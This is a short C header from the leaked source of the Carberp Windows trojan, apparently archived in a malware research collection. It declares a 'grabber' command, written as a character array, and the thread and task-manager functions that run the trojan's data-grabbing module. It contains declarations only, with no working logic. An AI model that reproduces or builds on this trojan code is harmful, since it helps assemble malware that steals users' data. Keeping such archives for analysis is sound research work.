/*
  name      Carberp
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#ifndef GrabberH
#define GrabberH
//------------------------------------------------------------------------------

#include <windows.h>
#include "Task.h"

const static char CommandGrabber[] = {'g','r','a','b','b','e','r',0};

DWORD WINAPI GrabberThread( LPVOID lpData );

bool ExecuteGrabber(PTaskManager Manager, PCHAR Command, PCHAR Args);

//------------------------------------------------------------------------------
#endif
